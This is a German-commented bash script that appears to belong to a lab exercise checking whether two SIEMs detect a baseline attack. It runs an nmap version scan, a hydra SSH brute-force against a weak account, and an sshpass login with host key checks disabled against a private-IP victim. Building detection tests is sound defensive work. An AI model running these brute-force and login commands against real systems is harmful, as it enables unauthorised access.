#!/usr/bin/env bash
# Szenario 1 - Baseline / Kontrolle. Laute, gut erkennbare Aktivitaet.
# Beide SIEMs sollen alle drei Events treffen.
#   E1 Portscan | E2 Brute-Force | E3 erfolgreicher Login
set -uo pipefail

VICTIM="${VICTIM_IP:-192.168.20.5}"
USER="${WEAK_USER:-sysops}"
PASS="${WEAK_PASS:-Sommer2025}"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

echo "[*] Szenario 1 - Start: $(date --iso-8601=seconds)"

echo "[E1] Port-Scan mit Versionserkennung gegen ${VICTIM}"
nmap -sV "${VICTIM}"

echo "[E2] SSH-Brute-Force gegen ${USER}@${VICTIM}"
hydra -l "${USER}" -P /opt/scenarios/passwords.txt -t 4 "ssh://${VICTIM}" || true

echo "[E3] Erfolgreicher Login mit dem gefundenen Passwort"
sshpass -p "${PASS}" ssh ${SSH_OPTS} "${USER}@${VICTIM}" "id; hostname"

echo "[*] Szenario 1 - Ende: $(date --iso-8601=seconds)"
